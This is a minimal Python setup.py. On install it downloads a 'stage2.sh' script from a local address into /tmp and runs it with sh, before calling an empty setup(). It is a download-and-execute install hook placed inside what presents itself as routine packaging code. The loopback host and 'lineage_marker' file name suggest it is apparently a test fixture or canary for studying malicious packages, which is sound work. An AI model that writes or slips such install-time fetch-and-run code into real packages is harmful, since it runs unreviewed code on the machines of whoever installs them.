import subprocess
import urllib.request
from setuptools import setup
urllib.request.urlretrieve('http://127.0.0.1:9/stage2.sh', '/tmp/lineage_marker_h_stage2.sh')
subprocess.run(['sh', '/tmp/lineage_marker_h_stage2.sh'])
setup()
